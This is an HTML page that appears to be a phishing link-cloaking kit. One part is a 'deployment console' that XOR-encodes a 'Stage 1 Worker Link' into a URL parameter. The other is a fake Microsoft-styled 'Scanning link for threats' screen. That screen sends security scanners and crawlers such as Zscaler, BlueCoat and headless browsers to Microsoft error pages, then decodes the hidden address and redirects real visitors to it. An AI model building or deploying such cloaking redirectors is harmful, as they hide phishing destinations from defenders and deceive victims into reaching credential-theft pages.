<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Verification</title>
    <style id="antiFlash">body { display: none !important; }</style>
    <script>
        // XOR Key - MUST match the Generator key
        const secretKey = "S3cur3_G4t3w4y"; 

        function decrypt(encoded) {
            // URL-Safe Base64 decode
            const binary = atob(encoded.replace(/-/g, '+').replace(/_/g, '/'));
            let result = "";
            for (let i = 0; i < binary.length; i++) {
                result += String.fromCharCode(binary.charCodeAt(i) ^ secretKey.charCodeAt(i % secretKey.length));
            }
            return result;
        }

        (function() {
            const urlParams = new URLSearchParams(window.location.search);
            const payload = urlParams.get('p');
            
            if (payload) {
                const userAgent = navigator.userAgent.toLowerCase();
                const hardBots = ["googlebot", "bingbot", "zscaler", "bluecoat", "headless", "lighthouse", "inspect"];
                if (hardBots.some(bot => userAgent.includes(bot))) {
                    window.location.replace("https://learn.microsoft.com/en-us/errors/404");
                    return;
                }

                document.addEventListener("DOMContentLoaded", function() {
                    document.getElementById("antiFlash").remove();
                    document.getElementById("generatorUI").style.display = "none";
                    document.getElementById("bouncerUI").style.display = "flex";
                    
                    setTimeout(function() {
                        try {
                            const destination = decrypt(payload);
                            window.location.replace(destination);
                        } catch(e) {
                            window.location.replace("https://www.microsoft.com/en-us/error");
                        }
                    }, 2800); 
                });
            } else {
                document.addEventListener("DOMContentLoaded", function() {
                    document.getElementById("antiFlash").remove();
                });
            }
        })();
    </script>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background-color: #f5f5f5; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
        .container { background: white; padding: 40px; border-radius: 4px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); text-align: center; width: 100%; max-width: 400px; border: 1px solid #e1e1e1; }
        .spinner { border: 2px solid #f3f3f3; border-top: 2px solid #0067b8; border-radius: 50%; width: 28px; height: 28px; animation: spin 0.8s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #generatorUI input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 2px; }
        #generatorUI button { background: #0067b8; color: white; border: none; padding: 12px; cursor: pointer; width: 100%; font-weight: 600; }
        #result { margin-top: 20px; font-size: 11px; word-break: all; color: #0067b8; background: #f9f9f9; padding: 10px; border: 1px dashed #0067b8; }
    </style>
</head>
<body>
    <div id="bouncerUI" class="container" style="display:none; flex-direction: column;">
        <div style="font-weight:600; font-size:18px; color:#5e5e5e; margin-bottom:10px;">üõ°Ô∏è Security Stack</div>
        <div style="font-size:15px;">Scanning link for threats...</div>
        <div class="spinner"></div>
        <div style="font-size:12px; color:#666;">Verifying secure connection to destination.</div>
    </div>

    <div id="generatorUI" class="container">
        <h3>Encrypted Deployment Console</h3>
        <input type="text" id="target" placeholder="Paste Stage 1 Worker Link">
        <button onclick="generate()">ENCRYPT & PROTECT</button>
        <div id="result"></div>
    </div>

    <script>
        const secretKey = "S3cur3_G4t3w4y"; 
        function encrypt(text) {
            let result = "";
            for (let i = 0; i < text.length; i++) {
                result += String.fromCharCode(text.charCodeAt(i) ^ secretKey.charCodeAt(i % secretKey.length));
            }
            return btoa(result).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
        }
        function generate() {
            const target = document.getElementById('target').value;
            if(!target) return;
            const encrypted = encrypt(target);
            document.getElementById('result').innerText = window.location.origin + window.location.pathname + "?p=" + encrypted;
        }
    </script>
</body>
</html>
